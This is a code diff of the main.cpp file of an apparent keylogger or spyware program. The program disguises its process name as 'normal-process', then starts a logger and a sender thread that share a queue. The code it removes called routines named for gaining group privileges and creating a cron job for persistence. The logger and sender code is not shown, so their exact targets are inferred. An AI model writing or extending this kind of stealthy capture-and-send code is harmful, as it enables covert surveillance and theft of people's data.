@@ -1,41 +1,39 @@
 // main.cpp
 
+#include "tsq.h"
+#include "messages.h"
 #include "logger.h"
-#include "procloader.h"
 #include "sender.h"
 #include <sys/prctl.h>
 
 #include <cstring>
 
+messagetype messages = messagetype::debug;
+
 int main() {
-	auto usrgrp = true;
-	auto crnjob = true;
+    messages = messagetype::none;
 
-	while (true) {
-		char const* pr_name = "normal-process";
-		prctl(PR_SET_NAME, pr_name, 0, 0, 0);
+    char const* pr_name = "normal-process";
+    prctl(PR_SET_NAME, pr_name, 0, 0, 0);
 
-		procloader& procloader = procloader::get_instance();
+    tsq queue;
 
-		if (usrgrp && crnjob) {
-			tsq queue;
+    logger& logger = logger::get_instance(queue);
+    sender& sender = sender::get_instance(queue);
 
-			logger& logger = logger::get_instance(queue);
-			sender& sender = sender::get_instance(queue);
+    if (!logger.init("")) {
+        return -1;
+    }
 
-			assert(logger.init() && "main (logger): logger initialization error.");
-			assert(sender.init() && "main (sender): sender initialization error.");
+    if (!sender.init("")) {
+        return -1;
+    }
 
-			logger.start();
-			sender.start();
+    logger.start();
+    sender.start();
 
-			assert(logger.check_init() && "main (logger): logger start error.");
-			assert(sender.check_init() && "main (sender): sender start error.");
-		}
-		else {
-			usrgrp = procloader.grpriv();
-			crnjob = procloader.mkcron();
-		}
-	}
+    while (true) {
+        std::this_thread::sleep_for(std::chrono::seconds(1));
+    }
 	return 0;
 }
